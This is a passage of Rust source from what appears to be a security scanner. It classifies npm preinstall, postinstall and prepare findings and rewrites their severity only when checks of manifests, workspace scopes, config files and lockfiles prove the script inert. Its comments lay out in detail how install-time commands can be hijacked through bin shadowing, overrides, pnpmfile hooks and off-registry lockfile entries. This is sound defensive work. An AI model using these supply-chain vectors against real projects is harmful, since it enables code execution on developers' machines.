//! Lifecycle-script classification: npm lifecycle findings whose command
//! provably cannot act on the installing machine.
//!
//! `INSTALL-003` (a `preinstall` / `postinstall` key) is Critical because npm
//! runs the command on every install, and `CODE-014` is High because
//! `execSync` with an interpolated command is a shell. Both are line rules:
//! they see the key or the call, never what it does. On the clean MCP-server
//! corpus that made three Microsoft launcher packages CRITICAL for a
//! postinstall that only checks `require.resolve` of its own platform
//! package, and Postman CRITICAL for `npx only-allow pnpm`.
//!
//! This pass reads the parsed manifest and the scripts it names and rewrites
//! a finding only when a positive test passes. Everything it cannot prove
//! stays exactly as the pack reported it:
//!
//! | Rule | From | Severity | Shape | Dependencies the phase may install |
//! |---|---|---|---|---|
//! | `INSTALL-010` | `INSTALL-003` | Medium | `node <local .js>` whose script, and the local scripts it requires, use no capability (see [`inert_source`]) | none |
//! | `INSTALL-011` | `INSTALL-003` | Low | exactly `npx only-allow <pm>`, with `only-allow` neither declared, bundled nor shipped | none |
//! | `INSTALL-012` | `INSTALL-004` | Low | `prepare` / `prepublish` whose `npm run` chain ends only in `tsc`, `husky`, `chmod +x`, `shx` / `rimraf` file operations on package-relative paths, `true` or `exit 0` | only the packages of the tools the steps name (`typescript`, `husky`, `shx`, `rimraf`) |
//! | `CODE-016` | `CODE-014` | Medium | `execSync` of `npm install <own name>-<platform>-<arch>@<own version>` in a `bin` script whose manifest lists those platform packages | (not a lifecycle script) |
//!
//! **Every name the three lifecycle rewrites trust resolves through
//! `node_modules/.bin` first.** npm, yarn and pnpm run a lifecycle script
//! through the shell with the `node_modules/.bin` of the package and of every
//! directory above it at the front of `PATH`, and link there the bins of
//! every package the install put in the tree: direct and transitive
//! dependencies and, at a workspace root, every member and every member's
//! dependencies. So the interpreter (`node`), the script shell (`sh`), the
//! runners a chain follows (`npm` / `pnpm` / `yarn` `run`, `npx`) and every
//! leaf command (`only-allow`, `tsc`, `husky`, `shx`, `rimraf`, `chmod`) is
//! only the real tool when nothing else the install linked has that name.
//! The shell builtins `true` and `exit` are the one exception.
//!
//! The classifier cannot see a dependency's bins (it does not fetch
//! dependencies), so it fails closed. A rewrite applies only when:
//!
//! - no trusted name is a `bin` of the manifest itself or, when the manifest
//!   is a workspace root or sits inside one (a `workspaces` field or a
//!   `pnpm-workspace.yaml`), of any `package.json` under that root. A manifest
//!   in that set that links its bins through `directories.bin` (whose files
//!   this pass cannot enumerate) keeps the original finding; and
//! - the dependency set the phase installs, across those same manifests, is
//!   empty apart from the trusted tools' own packages in the last column,
//!   each from a registry spec. For `preinstall` / `postinstall` /
//!   `preuninstall` / `postuninstall` that set is `dependencies`,
//!   `optionalDependencies`, `peerDependencies` and the bundled names; for
//!   `prepare` / `prepublish` it adds `devDependencies`. A field the
//!   classifier cannot read, a bundled name, or a shipped `node_modules`
//!   beside or above the package keeps the original finding; and
//! - no package-manager config file, in the package's directory or above it,
//!   changes what an install runs or where it fetches from: a `.pnpmfile.cjs`
//!   (a hook pnpm executes), a `.npmrc` setting `script-shell` / `shell` /
//!   `node-options` / `globalconfig` / `userconfig` or an off-registry
//!   `registry`, or a `.yarnrc` / `.yarnrc.yml` setting `yarn-path` /
//!   `yarnPath` / `plugins` / `packageExtensions` or an off-registry server. A
//!   `.npmrc` with only benign keys does not; and
//! - nothing in the install's scope can swap or add a package *below* a
//!   trusted tool (Codex review of #172, finding B): the tool's own
//!   dependencies are installed too, npm hoists them, and any of them can link
//!   a bin under a trusted name. So a manifest in the scope, or in a directory
//!   above the package, that declares a non-empty `overrides`, `resolutions`,
//!   `pnpm.overrides`, `pnpm.packageExtensions` or `pnpm.patchedDependencies`;
//!   a `pnpm-workspace.yaml` in those directories that declares `overrides`,
//!   `packageExtensions`, `patchedDependencies`, `configDependencies` or a
//!   pnpmfile, or cannot be read; and a lockfile there (`package-lock.json`,
//!   `npm-shrinkwrap.json`, `yarn.lock`, `pnpm-lock.yaml`, `bun.lock`,
//!   `bun.lockb`) with any entry that does not resolve to the public
//!   registry's tarball of the package it is filed under (a git, file,
//!   tarball, link, workspace, alias or patched entry), or that cannot be
//!   parsed, each keep the original finding. See
//!   [`Tree::resolution_side_channel`].
//!
//! A lockfile is not taken as evidence that no collision exists: npm links a
//! package's bins from the installed package's own manifest, not from the
//! lockfile's per-package `bin` metadata, which is attacker-written text; and
//! a dependency's lockfile is ignored when it is installed by a consumer. The
//! lockfile is read only to reject an install that resolves anything off the
//! registry.
//!
//! A rewritten finding keeps its file, line, phase and weight; its rule id,
//! severity and snippet change, and the snippet says why. Findings from
//! decoded content or an oversized file's tail are never rewritten: their
//! line is not the manifest line the classifier reads.

use std::cell::RefCell;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use regex::Regex;
use serde_json::Value;

use super::{Finding, Severity};

pub const RULE_INERT: &str = "INSTALL-010";
pub const RULE_GUARD: &str = "INSTALL-011";
pub const RULE_BUILD: &str = "INSTALL-012";
pub const RULE_LAUNCHER: &str = "CODE-016";

pub(crate) const TITLE_INERT: &str = "npm lifecycle script that only runs an inert local script";
pub(crate) const TITLE_GUARD: &str =
    "npm lifecycle script that only enforces a package manager (only-allow)";
pub(crate) const TITLE_BUILD: &str = "npm prepare/prepublish script that only builds the package";
pub(crate) const TITLE_LAUNCHER: &str =
    "Launcher installs its own platform-specific package at run time";

/// Largest script, and longest line, the inert test accepts.
const MAX_INERT_BYTES: usize = 4096;
const MAX_INERT_LINE: usize = 200;
/// How many `require` hops from the lifecycle script are followed.
const MAX_INERT_DEPTH: usize = 2;
/// How many `npm run` hops a `prepare` chain is followed.
const MAX_RUN_DEPTH: usize = 3;
/// Launcher scripts larger than this are not analysed.
const MAX_LAUNCHER_BYTES: usize = 256 * 1024;
/// A package-manager file ([`read_install_file`]) larger than this is not
/// read, and counts as one that cannot be parsed (the rewrite fails closed).
const MAX_RESOLUTION_FILE_BYTES: u64 = 64 * 1024 * 1024;

/// A pattern compiled once per process (see [`re!`]).
fn cached(cell: &'static OnceLock<Regex>, pattern: &str) -> &'static Regex {
    cell.get_or_init(|| Regex::new(pattern).expect("static regex"))
}

macro_rules! re {
    ($pat:expr) => {{
        static RE: OnceLock<Regex> = OnceLock::new();
        cached(&RE, $pat)
    }};
}

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------

/// `name` inside `dir` (both relative to the scan base).
fn join_rel(dir: &str, name: &str) -> String {
    if dir.is_empty() {
        name.to_string()
    } else {
        format!("{dir}/{name}")
    }
}

fn split_rel(rel: &str) -> (&str, &str) {
    match rel.rsplit_once('/') {
        Some((dir, name)) => (dir, name),
        None => ("", rel),
    }
}

/// `rel` resolved against `dir` (both '/'-separated, relative to the scan
/// base), or `None` when it climbs above `floor`.
fn resolve_under(floor: &str, dir: &str, rel: &str) -> Option<String> {
    if rel.starts_with('/') || rel.contains('\\') {
        return None;
    }
    let mut parts: Vec<&str> = dir.split('/').filter(|s| !s.is_empty()).collect();
    let floor_len = floor.split('/').filter(|s| !s.is_empty()).count();
    if parts.len() < floor_len {
        return None;
    }
    for seg in rel.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                if parts.len() <= floor_len {
                    return None;
                }
                parts.pop();
            }
            s => parts.push(s),
        }
    }
    Some(parts.join("/"))
}

/// A path argument a build step may touch: relative to the package, with no
/// way to climb out of it or to reach a variable, home directory or shell
/// syntax. Globs are allowed; the shell expands them inside the package.
pub(crate) fn is_package_relative_path(p: &str) -> bool {
    !p.is_empty()
        && p.bytes().all(|b| {
            b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'/' | b'*' | b'-' | b'@' | b'+')
        })
        && !p.starts_with(['/', '~', '$', '-'])
        && !p.split('/').any(|seg| seg == "..")
}

// ---------------------------------------------------------------------------
// The tree
// ---------------------------------------------------------------------------

struct Manifest {
    /// Directory holding the manifest, relative to the scan base.
    dir: String,
    rel: String,
    text: String,
    doc: Value,
}

impl Manifest {
    fn scripts(&self) -> Option<&serde_json::Map<String, Value>> {
        self.doc.get("scripts").and_then(Value::as_object)
    }

    fn script(&self, name: &str) -> Option<&str> {
        self.scripts()?.get(name)?.as_str()
    }

    fn line(&self, n: usize) -> Option<&str> {
        self.text.lines().nth(n.checked_sub(1)?)
    }

    /// Every dependency section's spec for `pkg`.
    fn declared_specs(&self, pkg: &str) -> Vec<&Value> {
        [
            "dependencies",
            "devDependencies",
            "optionalDependencies",
            "peerDependencies",
        ]
        .iter()
        .filter_map(|s| self.doc.get(s)?.get(pkg))
        .collect()
    }

    /// Is `pkg` bundled into the tarball (`bundleDependencies: true` bundles
    /// every dependency)?
    fn bundles(&self, pkg: &str) -> bool {
        ["bundleDependencies", "bundledDependencies"]
            .iter()
            .filter_map(|k| self.doc.get(k))
            .any(|v| match v {
                Value::Bool(b) => *b,
                Value::Array(a) => a.iter().any(|x| x.as_str() == Some(pkg)),
                Value::Null => false,
                _ => true,
            })
    }

    /// Does an `overrides` / `resolutions` / `pnpm` block mention `pkg`?
    /// Any of them can swap the package for a git or tarball source.
    fn overrides(&self, pkg: &str) -> bool {
        overrides_in(&self.doc, pkg)
    }
}

/// [`Manifest::overrides`] for any parsed manifest.
fn overrides_in(doc: &Value, pkg: &str) -> bool {
    // npm `overrides` nest by package name, yarn `resolutions` key by a
    // path (`**/pkg`, `a/pkg`), pnpm `overrides` by `pkg@range` or
    // `a>pkg`: a key names `pkg` when its last segment is `pkg`, with
    // or without a version.
    let names = Regex::new(&format!(r"(?:^|[/>*]){}(?:@[^/>]*)?$", regex::escape(pkg)));
    let Ok(names) = names else {
        return true;
    };
    fn any_key(v: &Value, names: &Regex) -> bool {
        match v {
            Value::Object(o) => o
                .iter()
                .any(|(k, v)| names.is_match(k) || any_key(v, names)),
            Value::Array(a) => a.iter().any(|v| any_key(v, names)),
            _ => false,
        }
    }
    ["overrides", "resolutions", "pnpm"]
        .iter()
        .filter_map(|k| doc.get(k))
        .any(|v| any_key(v, &names))
}

/// A manifest field that changes which package is installed under a name, or
/// what an installed package contains, anywhere in the dependency tree: a
/// non-empty `overrides` (npm), `resolutions` (yarn, including `patch:`
/// entries), `pnpm.overrides`, `pnpm.packageExtensions` (adds dependencies to
/// a dependency's manifest) or `pnpm.patchedDependencies` (rewrites a
/// dependency's files). [`overrides_in`] asks this about one trusted tool; a
/// *transitive* dependency of that tool is just as able to link a bin under
/// a trusted name once npm hoists it, so any entry keeps the finding. A field
/// of the wrong type is treated as non-empty (fail closed).
fn declares_resolution_changes(doc: &Value) -> bool {
    fn non_empty(v: Option<&Value>) -> bool {
        match v {
            None | Some(Value::Null) => false,
            Some(Value::Object(o)) => !o.is_empty(),
            Some(Value::Array(a)) => !a.is_empty(),
            Some(_) => true,
        }
    }
    if non_empty(doc.get("overrides")) || non_empty(doc.get("resolutions")) {
        return true;
    }
    match doc.get("pnpm") {
        None | Some(Value::Null) => false,
        Some(Value::Object(p)) => ["overrides", "packageExtensions", "patchedDependencies"]
            .iter()
            .any(|k| non_empty(p.get(*k))),
        Some(_) => true,
    }
}

/// A plain version as a lockfile records a registry package: `1.2.3`,
/// `1.0.0-beta.1`, `0.0.0+build`. Not a range, tag, path, URL or alias.
fn is_plain_version(v: &str) -> bool {
    v.as_bytes().first().is_some_and(u8::is_ascii_digit)
        && v.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'+'))
}

/// `name` split from `name@range` (a scoped name keeps its leading `@`).
fn split_descriptor(d: &str) -> Option<(&str, &str)> {
    let at = d.get(1..)?.find('@')? + 1;
    Some((&d[..at], &d[at + 1..]))
}

/// A public-registry tarball URL for `name` itself:
/// `https://registry.npmjs.org/<name>/-/<unscoped>-<version>.tgz` (or the
/// yarn mirror of it, with an optional `#<hash>`). A tarball of another
/// package on the same registry is an alias and does not count.
fn is_registry_tarball_of(name: &str, url: &str) -> bool {
    let Some(rest) = [
        "https://registry.npmjs.org/",
        "https://registry.yarnpkg.com/",
    ]
    .iter()
    .find_map(|p| url.strip_prefix(p)) else {
        return false;
    };
    let rest = rest.split('#').next().unwrap_or(rest);
    let unscoped = name.rsplit('/').next().unwrap_or(name);
    rest.strip_prefix(name)
        .and_then(|r| r.strip_prefix("/-/"))
        .and_then(|r| r.strip_prefix(unscoped))
        .and_then(|r| r.strip_prefix('-'))
        .and_then(|r| r.strip_suffix(".tgz"))
        .is_some_and(is_plain_version)
}

/// `package-lock.json` / `npm-shrinkwrap.json`: `true` unless the file parses
/// and every entry is a public-registry package under its own name. The
/// project's own entry (`""`) is skipped; a workspace member's entry, a
/// `link`, an entry whose `name` differs from its folder (an alias), a
/// `resolved` that is not the registry tarball of that name, and a `version`
/// that is not a plain version (v1 records `file:`, `git+…` and `npm:` specs
/// there) each count as off the registry.
fn npm_lock_off_registry(text: &str) -> bool {
    fn entry_off(name: &str, entry: &Value) -> bool {
        let Some(e) = entry.as_object() else {
            return true;
        };
        if e.get("link").is_some_and(|v| v != &Value::Bool(false)) {
            return true;
        }
        if e.get("name").is_some_and(|n| n.as_str() != Some(name)) {
            return true;
        }
        if !e
            .get("version")
            .and_then(Value::as_str)
            .is_some_and(is_plain_version)
        {
            return true;
        }
        // No `resolved`: a bundled dependency (it ships inside its parent's
        // registry tarball) or a registry entry written with
        // `omit-lockfile-registry-resolved`; the plain version above is then
        // fetched from the configured registry, which the `.npmrc` check
        // holds to the public one.
        e.get("resolved")
            .is_some_and(|r| !r.as_str().is_some_and(|u| is_registry_tarball_of(name, u)))
    }
    fn v1_off(deps: &Value, depth: usize) -> bool {
        let Some(d) = deps.as_object() else {
            return true;
        };
        depth > 64
            || d.iter().any(|(name, e)| {
                entry_off(name, e)
                    || e.get("dependencies")
                        .is_some_and(|nested| v1_off(nested, depth + 1))
            })
    }
    let Ok(doc) = serde_json::from_str::<Value>(text) else {
        return true;
    };
    let Some(obj) = doc.as_object() else {
        return true;
    };
    if let Some(packages) = obj.get("packages") {
        let Some(packages) = packages.as_object() else {
            return true;
        };
        for (key, entry) in packages {
            if key.is_empty() {
                continue;
            }
            // `node_modules/a/node_modules/@s/b` is `@s/b`; a key without
            // `node_modules/` is a workspace member's or a linked
            // directory's own entry.
            let Some((_, name)) = key.rsplit_once("node_modules/") else {
                return true;
            };
            if entry_off(name, entry) {
                return true;
            }
        }
    }
    obj.get("dependencies").is_some_and(|d| v1_off(d, 0))
}

/// `yarn.lock`, classic (v1) or Berry (YAML with a `__metadata` block).
fn yarn_lock_off_registry(text: &str) -> bool {
    if text.lines().any(|l| l.trim_end() == "__metadata:") {
        yarn_berry_off_registry(text)
    } else {
        yarn_v1_off_registry(text)
    }
}

/// A classic `yarn.lock`: every entry's descriptors are one package name with
/// a registry range, its `version` is plain and its `resolved` (when given)
/// is the public registry's tarball of that name. Any field or line this does
/// not recognise counts as unparseable.
fn yarn_v1_off_registry(text: &str) -> bool {
    let mut current: Option<String> = None;
    for raw in text.lines() {
        let line = raw.trim_end_matches('\r');
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let indent = line.len() - line.trim_start_matches(' ').len();
        if line.starts_with('\t') {
            return true;
        }
        if indent == 0 {
            let Some(header) = line.strip_suffix(':') else {
                return true;
            };
            let mut name: Option<&str> = None;
            for d in header.split(',') {
                let d = d.trim().trim_matches('"');
                let Some((n, range)) = split_descriptor(d) else {
                    return true;
                };
                let registry_range = !range.trim().is_empty()
                    && range.bytes().all(|b| {
                        b.is_ascii_alphanumeric()
                            || matches!(
                                b,
                                b'.' | b'^'
                                    | b'~'
                                    | b'<'
                                    | b'>'
                                    | b'='
                                    | b'|'
                                    | b'*'
                                    | b'+'
                                    | b'-'
                                    | b' '
                            )
                    });
                if !registry_range || name.is_some_and(|x| x != n) {
                    return true;
                }
                name = Some(n);
            }
            current = name.map(str::to_string);
            continue;
        }
        let Some(name) = current.as_deref() else {
            return true;
        };
        if indent > 2 {
            // A dependency range of the locked package; its resolution is an
            // entry of its own, checked above.
            continue;
        }
        let (key, value) = trimmed.split_once(' ').unwrap_or((trimmed, ""));
        let value = value.trim().trim_matches('"');
        match key {
            "version" if !is_plain_version(value) => return true,
            "resolved" if !is_registry_tarball_of(name, value) => return true,
            "version" | "resolved" | "integrity" | "uid" => {}
            "dependencies:" | "optionalDependencies:" if value.is_empty() => {}
            _ => return true,
        }
    }
    false
}

/// A Berry `yarn.lock` (YAML): every entry resolves to `name@npm:<version>`
/// under the name its descriptors ask for, with `linkType: hard`. Two other
/// entries are accepted: the project itself (`workspace:.`) and yarn's own
/// built-in compatibility patch of a registry package
/// (`patch:…#optional!builtin<compat/…>`), whose patch ships inside yarn.
fn yarn_berry_off_registry(text: &str) -> bool {
    let Ok(doc) = serde_yaml::from_str::<serde_yaml::Value>(text) else {
        return true;
    };
    let Some(map) = doc.as_mapping() else {
        return true;
    };
    for (key, entry) in map {
        let Some(key) = key.as_str() else {
            return true;
        };
        if key == "__metadata" {
            continue;
        }
        let mut name: Option<&str> = None;
        for d in key.split(',') {
            let Some((n, _)) = split_descriptor(d.trim()) else {
                return true;
            };
            if name.is_some_and(|x| x != n) {
                return true;
            }
            name = Some(n);
        }
        let Some(name) = name else {
            return true;
        };
        let Some(entry) = entry.as_mapping() else {
            return true;
        };
        let Some(resolution) = entry.get("resolution").and_then(|v| v.as_str()) else {
            return true;
        };
        let link = entry.get("linkType").and_then(|v| v.as_str());
        let Some((rname, source)) = split_descriptor(resolution) else {
            return true;
        };
        if rname != name {
            return true;
        }
        let ok = if let Some(v) = source.strip_prefix("npm:") {
            is_plain_version(v) && link == Some("hard")
        } else if source == "workspace:." {
            link == Some("soft")
        } else if let Some(p) = source.strip_prefix("patch:") {
            let builtin = re!(
                r"^(?P<n>(?:@[a-z0-9._-]+/)?[a-z0-9._-]+)@npm%3A[0-9A-Za-z.+-]+#(?:optional!)?~?builtin<compat/[a-z0-9-]+>(?:::[A-Za-z0-9=&._-]*)?$"
            );
            link == Some("hard") && builtin.captures(p).is_some_and(|c| &c["n"] == name)
        } else {
            false
        };
        if !ok {
            return true;
        }
    }
    false
}

/// `pnpm-lock.yaml`: `true` unless it parses as a pnpm lockfile, records no
/// override, package extension, patch or pnpmfile, resolves every package by
/// registry `integrity` alone (a `tarball`, git `repo` / `commit` or
/// `directory` resolution is off the registry), and every dependency it
/// links is a plain version (a `link:` / `file:` target or an alias to
/// another package's name is not).
fn pnpm_lock_off_registry(text: &str) -> bool {
    use serde_yaml::Value as Y;
    fn version_off(v: &Y) -> bool {
        let s = match v {
            Y::String(s) => s.as_str(),
            Y::Mapping(m) => match m.get("version").and_then(Y::as_str) {
                Some(s) => s,
                None => return true,
            },
            Y::Number(_) => return false,
            _ => return true,
        };
        // Peer-dependency suffixes: `1.0.0(react@18.2.0)` (v6+),
        // `1.0.0_react@18.2.0` (v5).
        let base = s.split(['(', '_']).next().unwrap_or(s);
        !is_plain_version(base)
    }
    fn deps_off(entry: &Y) -> bool {
        let Some(e) = entry.as_mapping() else {
            return !entry.is_null();
        };
        ["dependencies", "devDependencies", "optionalDependencies"]
            .iter()
            .filter_map(|k| e.get(*k))
            .any(|deps| match deps {
                Y::Mapping(d) => d.values().any(version_off),
                Y::Null => false,
                _ => true,
            })
    }
    let Ok(doc) = serde_yaml::from_str::<Y>(text) else {
        return true;
    };
    let Some(map) = doc.as_mapping() else {
        return true;
    };
    if map.get("lockfileVersion").is_none() {
        return true;
    }
    if [
        "overrides",
        "packageExtensionsChecksum",
        "patchedDependencies",
        "pnpmfileChecksum",
    ]
    .iter()
    .any(|k| map.get(*k).is_some_and(|v| !v.is_null()))
    {
        return true;
    }
    // A single-project v5 / v6 lockfile keeps its dependencies at the top.
    if deps_off(&doc) {
        return true;
    }
    for section in ["importers", "snapshots"] {
        match map.get(section) {
            None | Some(Y::Null) => {}
            Some(Y::Mapping(m)) => {
                if m.iter().any(|(k, e)| {
                    k.as_str().is_none_or(|k| k.contains("patch_hash")) || deps_off(e)
                }) {
                    return true;
                }
            }
            Some(_) => return true,
        }
    }
    match map.get("packages") {
        None | Some(Y::Null) => false,
        Some(Y::Mapping(m)) => m.iter().any(|(k, e)| {
            let Some(k) = k.as_str() else {
                return true;
            };
            let Some(entry) = e.as_mapping() else {
                return true;
            };
            let registry = entry
                .get("resolution")
                .and_then(Y::as_mapping)
                .is_some_and(|r| {
                    !r.is_empty() && r.keys().all(|k| k.as_str() == Some("integrity"))
                });
            !registry
                || [
                    "://",
                    "file:",
                    "link:",
                    "git+",
                    "git:",
                    "github:",
                    "patch_hash",
                ]
                .iter()
                .any(|t| k.contains(t))
                || deps_off(e)
        }),
        Some(_) => true,
    }
}

/// A `pnpm-workspace.yaml` that changes what the install resolves or runs:
/// `overrides`, `packageExtensions`, `patchedDependencies`,
/// `configDependencies` (installed first, and able to supply a pnpmfile) or
/// a `pnpmfile` path, or a file that does not parse as a mapping.
fn pnpm_workspace_alters_install(text: &str) -> bool {
    let doc = match serde_yaml::from_str::<serde_yaml::Value>(text) {
        Ok(d) => d,
        Err(_) => return true,
    };
    match doc {
        serde_yaml::Value::Null => false,
        serde_yaml::Value::Mapping(m) => [
            "overrides",
            "packageExtensions",
            "patchedDependencies",
            "configDependencies",
            "pnpmfile",
            "globalPnpmfile",
        ]
        .iter()
        .any(|k| m.get(*k).is_some_and(|v| !v.is_null())),
        _ => true,
    }
}

/// Which install runs a lifecycle key, and so which dependency fields have
/// put packages (and their bins) into `node_modules` before it runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum InstallPhase {
    /// `preinstall` / `postinstall` / `preuninstall` / `postuninstall`: a
    /// consumer's install of the package, which installs its dependencies,
    /// optional and peer dependencies (npm 7+ installs peers).
    Install,
    /// `prepare` / `prepublish` and the `pre` / `post` scripts npm runs
    /// around them: a local install, a git dependency's install or a
    /// publish, all of which install `devDependencies` as well.
    Prepare,
}

impl InstallPhase {
    fn dependency_fields(self) -> &'static [&'static str] {
        match self {
            InstallPhase::Install => &["dependencies", "optionalDependencies", "peerDependencies"],
            InstallPhase::Prepare => &[
                "dependencies",
                "optionalDependencies",
                "peerDependencies",
                "devDependencies",
            ],
        }
    }
}

/// The manifests whose packages share `node_modules/.bin` with a lifecycle
/// script, as far as the scanned tree shows them: the script's own manifest
/// and, when it is a workspace root or sits inside one, the root's and every
/// other `package.json` under that root (npm, yarn and pnpm hoist every
/// member, and every member's dependencies, into the root `node_modules`).
struct Scope {
    /// `(directory, parsed document)` of each manifest, the script's own first.
    manifests: Vec<(String, Value)>,
    /// Every command name those manifests' own `bin` fields link.
    bins: HashSet<String>,
    /// A manifest in the scope declares `directories.bin`: npm links *every*
    /// file in that directory as a bin, and this pass cannot enumerate them
    /// (a file may be skipped or binary), so the set of linked names is
    /// unknown and any trusted name might collide.
    bins_unknown: bool,
}

impl Scope {
    /// Does any name the rewrite trusts collide with a bin the scope's own
    /// manifests link? `sh` is always trusted: npm and pnpm spawn the script
    /// shell by name with the lifecycle `PATH`. When a scope manifest uses
    /// `directories.bin` the linked names cannot be enumerated, so every
    /// trusted name is treated as shadowed (fail closed).
    fn shadows<'n>(&self, trusted: impl IntoIterator<Item = &'n str>) -> bool {
        self.bins_unknown
            || self.bins.contains("sh")
            || trusted.into_iter().any(|n| self.bins.contains(n))
    }

    /// Finding 2 of the #172 review, failing closed: `true` only when every
    /// package the phase installs, across every manifest in the scope, is one
    /// of `allowed` (the trusted tools' own packages) declared with a registry
    /// spec. Any other dependency could link a bin with a trusted name that
    /// runs in the tool's place, and this pass cannot see a dependency's bins.
    /// A dependency field that is not an object, and any bundled name (a
    /// bundled package ships its own bins), fail. A lockfile is not consulted:
    /// its per-package `bin` metadata is not what npm links.
    fn installs_only(&self, phase: InstallPhase, allowed: &[&str]) -> bool {
        self.manifests.iter().all(|(_, doc)| {
            phase
                .dependency_fields()
                .iter()
                .all(|field| match doc.get(*field) {
                    None => true,
                    Some(Value::Object(deps)) => deps.iter().all(|(name, spec)| {
                        allowed.contains(&name.as_str()) && is_registry_spec(spec)
                    }),
                    Some(_) => false,
                })
                && ["bundleDependencies", "bundledDependencies"]
                    .iter()
                    .all(|k| match doc.get(*k) {
                        None | Some(Value::Bool(false)) => true,
                        Some(Value::Array(a)) => a.is_empty(),
                        Some(_) => false,
                    })
        })
    }
}

/// A registry version range or dist-tag: not a git, GitHub, file, link,
/// tarball URL, `npm:` alias or workspace reference.
fn is_registry_spec(spec: &Value) -> bool {
    let Some(s) = spec.as_str() else {
        return false;
    };
    !s.trim().is_empty()
        && s.bytes().all(|b| {
            b.is_ascii_alphanumeric()
                || matches!(
                    b,
                    b'.' | b'^' | b'~' | b'<' | b'>' | b'=' | b'|' | b'*' | b'+' | b'-' | b' '
                )
        })
}

/// The command names a manifest's `bin` field installs into `node_modules/.bin`.
/// An object `bin` names each key; a string `bin` takes the package's own
/// (unscoped) name. These are the names that can shadow a command a lifecycle
/// script runs, because npm/yarn/pnpm prepend `node_modules/.bin` to PATH.
fn bin_names(doc: &Value) -> Vec<String> {
    match doc.get("bin") {
        Some(Value::String(_)) => doc
            .get("name")
            .and_then(Value::as_str)
            .map(|n| vec![n.rsplit('/').next().unwrap_or(n).to_string()])
            .unwrap_or_default(),
        Some(Value::Object(o)) => o.keys().cloned().collect(),
        _ => Vec::new(),
    }
}

/// Whether a manifest links its bins through `directories.bin`: npm adds every
/// file in that directory as a `node_modules/.bin` entry when it packs the
/// package, so a `directories.bin` directory can ship a file named like any
/// trusted tool, runner or interpreter. [`bin_names`] cannot list them from
/// the manifest alone, so its presence makes the scope's bin set unknowable.
fn declares_directories_bin(doc: &Value) -> bool {
    doc.get("directories")
        .and_then(|d| d.get("bin"))
        .is_some_and(|v| !v.is_null())
}

struct Tree<'a> {
    base: &'a Path,
    present: HashSet<String>,
    manifests: HashMap<String, Option<Manifest>>,
    /// [`Tree::dir_alters_resolution`] per directory: a lockfile is parsed
    /// once however many lifecycle findings share it.
    resolution: RefCell<HashMap<String, bool>>,
}

impl<'a> Tree<'a> {
    fn new(base: &'a Path, files: &[PathBuf]) -> Self {
        let present = files
            .iter()
            .map(|p| {
                p.strip_prefix(base)
                    .unwrap_or(p)
                    .to_string_lossy()
                    .replace('\\', "/")
            })
            .collect();
        Tree {
            base,
            present,
            manifests: HashMap::new(),
            resolution: RefCell::new(HashMap::new()),
        }
    }

    fn read(&self, rel: &str) -> Option<String> {
        if !self.present.contains(rel) {
            return None;
        }
        std::fs::read_to_string(self.base.join(rel)).ok()
    }

    /// The parsed manifest at `rel`, loaded by [`Self::load_manifest`].
    fn manifest(&self, rel: &str) -> Option<&Manifest> {
        self.manifests.get(rel)?.as_ref()
    }

    /// Parse and cache the manifest at `rel` (once).
    fn load_manifest(&mut self, rel: &str) {
        if !self.manifests.contains_key(rel) {
            let parsed = self.read(rel).and_then(|text| {
                let doc: Value = serde_json::from_str(&text).ok()?;
                doc.is_object().then(|| Manifest {
                    dir: split_rel(rel).0.to_string(),
                    rel: rel.to_string(),
                    text,
                    doc,
                })
            });
            self.manifests.insert(rel.to_string(), parsed);
        }
    }

    /// Whether a package directory carries something that changes what an
    /// install runs beyond its scripts: a shipped `node_modules` (the tools a
    /// script names would run from it) or a `binding.gyp` (npm then also runs
    /// `node-gyp rebuild`, whose configuration can run commands).
    fn install_side_channel(&self, dir: &str) -> bool {
        let under = |name: &str| {
            if dir.is_empty() {
                name.to_string()
            } else {
                format!("{dir}/{name}")
            }
        };
        let nm = under("node_modules");
        self.base.join(&nm).exists()
            || self.base.join(under("binding.gyp")).exists()
            || self.present.contains(&under("binding.gyp"))
            || self
                .present
                .iter()
                .any(|p| p.starts_with(&format!("{nm}/")))
    }

    /// The [`Scope`] of `m`'s lifecycle scripts: `m`, and — when `m` is a
    /// workspace root or sits inside one (a `workspaces` field, or a
    /// `pnpm-workspace.yaml` beside the manifest) — every `package.json` under
    /// the outermost such root. npm, yarn and pnpm hoist workspace members'
    /// bins, and their dependencies' bins, into the root `node_modules/.bin`,
    /// and a member's scripts run with that directory on PATH too. `None`
    /// (no rewrite) when a manifest in the scope, or one above `m` that
    /// decides whether it is in a workspace, cannot be read as JSON: npm might
    /// read what this pass cannot, bins included.
    fn scope(&self, m: &Manifest) -> Option<Scope> {
        let mut root: Option<&str> = None;
        let mut dir = m.dir.as_str();
        loop {
            let declares_workspaces = if dir == m.dir {
                m.doc.get("workspaces").is_some()
            } else {
                let rel = join_rel(dir, "package.json");
                if self.present.contains(&rel) {
                    let doc: Value = serde_json::from_str(&self.read(&rel)?).ok()?;
                    doc.get("workspaces").is_some()
                } else {
                    false
                }
            };
            if declares_workspaces || self.present.contains(&join_rel(dir, "pnpm-workspace.yaml")) {
                root = Some(dir);
            }
            if dir.is_empty() {
                break;
            }
            dir = split_rel(dir).0;
        }
        let mut manifests = vec![(m.dir.clone(), m.doc.clone())];
        if let Some(root) = root {
            let prefix = if root.is_empty() {
                String::new()
            } else {
                format!("{root}/")
            };
            let mut members: Vec<&String> = self
                .present
                .iter()
                .filter(|rel| {
                    *rel != &m.rel
                        && split_rel(rel).1 == "package.json"
                        && !rel.contains("node_modules/")
                        && rel.starts_with(&prefix)
                })
                .collect();
            members.sort();
            for rel in members {
                let doc: Value = serde_json::from_str(&self.read(rel)?).ok()?;
                if !doc.is_object() {
                    return None;
                }
                manifests.push((split_rel(rel).0.to_string(), doc));
            }
        }
        let bins = manifests.iter().flat_map(|(_, d)| bin_names(d)).collect();
        let bins_unknown = manifests.iter().any(|(_, d)| declares_directories_bin(d));
        Some(Scope {
            manifests,
            bins,
            bins_unknown,
        })
    }

    /// A `node_modules` shipped in a directory above the package: npm puts the
    /// `node_modules/.bin` of every ancestor directory on a lifecycle
    /// script's PATH, so whatever that tree links can shadow a trusted name.
